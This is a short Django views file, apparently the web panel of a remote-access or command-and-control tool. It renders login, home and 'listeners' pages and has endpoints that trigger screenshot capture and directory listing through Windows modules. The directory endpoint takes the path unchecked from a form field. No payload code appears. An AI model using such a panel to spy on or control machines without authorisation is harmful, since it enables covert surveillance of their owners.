import imp
from unicodedata import name
from django.shortcuts import render
from blog.Modules.windows.screenshot import ScreenShot
from blog.Modules.windows.DirectoryListing import DirectoryListing

def LoginPage(request):
    return render(request  , 'blog/login.html' )

def HomePage(request):
    return render(request  , 'blog/HomePage.html' )

def ListenersPage(request):
    return render(request  , 'blog/listeners.html' )

def ScreenShotMethod(request):
    ScreenShot()    
    return render(request  , 'blog/listeners.html' )

def dirlist(request):
    DirectoryListing(request.POST["dir"])         
    return render(request  , 'blog/listeners.html' )